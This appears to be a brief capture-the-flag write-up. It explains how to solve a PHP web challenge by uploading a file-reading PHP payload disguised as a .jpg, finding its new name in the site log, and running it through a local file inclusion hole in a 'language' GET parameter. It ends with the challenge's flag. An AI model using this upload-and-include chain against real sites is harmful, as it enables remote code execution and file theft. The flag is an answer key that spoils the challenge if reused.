payload file with any name that bypass the validation (jpg and etc) like test.jpg with content

```php
<?php 
  $file = '/flag.txt'; 
  $content = file_get_contents($file); 
  echo $content; 
?>

```

then you need to go to `/logs/site_log.txt` because real filename will be changed after upload. 
Upload your file and go to `conspiracy` page, because there we can `include` that file (it will be executed)


```php
$language = $_GET['language'] ?? 'languages/english.php';
```

we can abuse this GET paramter with `/var/www/html/` + your filename from logs, so full url payload will be like


`flag{6558608db040d1c64358ad536a8e06c6}`
